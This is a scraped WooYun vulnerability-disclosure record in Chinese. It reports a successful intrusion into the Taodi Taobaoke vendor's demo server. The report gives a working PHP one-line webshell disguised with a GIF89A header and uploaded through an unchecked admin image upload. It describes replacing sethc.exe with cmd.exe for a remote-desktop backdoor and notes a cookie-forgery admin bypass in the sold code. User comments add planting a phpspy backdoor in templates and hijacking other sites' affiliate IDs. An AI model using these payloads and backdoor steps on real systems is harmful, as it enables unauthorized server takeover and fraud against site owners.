{"id": 22626, "wybug_id": "wooyun-2011-02339", "wybug_title": "淘帝淘宝客安全意识差，编写源码漏洞太多，直接拿下服务器（vps）", "wybug_corp": "淘帝淘宝客taodisoft.com", "wybug_author": "isee", "wybug_date": "2011-06-29 09:58", "wybug_open_date": "2011-06-29 10:33", "wybug_type": "地下0day/成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "文件上传内容未检查", "提权", "文件权限", "欺骗", "文件上传漏洞", "淘帝淘宝客漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-06-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2011-06-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 1、演示站后台竟然有一个地方可上传图片，没有禁止上传。2、上传图片简单过滤，很容易突破，上传php文件，并能执行。3、服务器(vps)配置严重低级，拿到webshell之后直接是系统权限，windows系统，替换sethc.exe，直接远程桌面连接即可。4、其所销售的源代码同样存在此上传漏洞。5、其所销售的源代码还存在伪造cookie直接进入后台漏洞。所以其所销售的源代码网站后台路径不改，可直接修改cookie进入后台，插入一句话木马或者直接上传可执行文件，拿到webshell。 详细说明：  \n\n1、上传地址是：后台-首页配置-分类产品-下面图片上传2、直接构造shell.php文件代码是\nGIF89A<?php @eval($_POST['pass']);?>\n3、上传即可得到shell,地址是:http://pro.taodisoft.com/img/index/shell.php4、拿到webshell之后就是系统权限了。。。。。。。\n\n   漏洞证明：  \n\n把sethc.exe替换成cmd.exe了   修复方案：  洞太多了，所有购买源码的客户都受到威胁。   版权声明：转载请注明来源 isee@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2011-06-29 11:07 |    \t\tarctan0 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:3        | @nsfocus)\t\t \n  兄弟真牛，自己曝光自己的入侵事件，不怕被跨省啊？    \n     2011-06-29 11:20 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  一般不涉及经济的测试都没有问题的额    \n     2011-06-29 12:14 |    \t\t风云 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 简要介绍)\t\t \n  已帮他修补好了,程序员太马虎了    \n     2011-06-29 12:44 |    \t\tsaga \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 世界上只有10种人，懂二进制的，和不懂二进...)\t\t \n  人家是路人甲，    \n     2011-06-30 11:27 |    \t\tetcat \t\t\t( 普通白帽子  |\t\t\t        Rank:149 漏洞数:22        | 0101010101001010101010101010100101010101...)\t\t \n  哈哈 太强大了 佩服你了    \n     2012-02-08 19:01 |    \t\t紫梦芊 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:9        | 踏踏实实做测试)\t\t \n  早发现的漏洞了~而且还可以修改模版文件我是修改的模版文件 直接if($_GET['**']){ /*phpspy*/}    \n     2012-03-18 20:08 |    \t\tFrankie \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 你存在,我的代码里...Line 0://你)\t\t \n  @xsser 今天看到你这句话,想起了,曾经看到某报道说...不射J的插入不算强奸...淡淡的笑过...    \n     2012-07-21 21:28 |    \t\tCp0204 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:4        | 著名艺术家)\t\t \n  @Frankie 你暴强，还有带了套的不算~~ 这源码不用数据库，用php存配置，一句话强力插入。。把用淘帝的站淘客id都改了，就暴强了    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}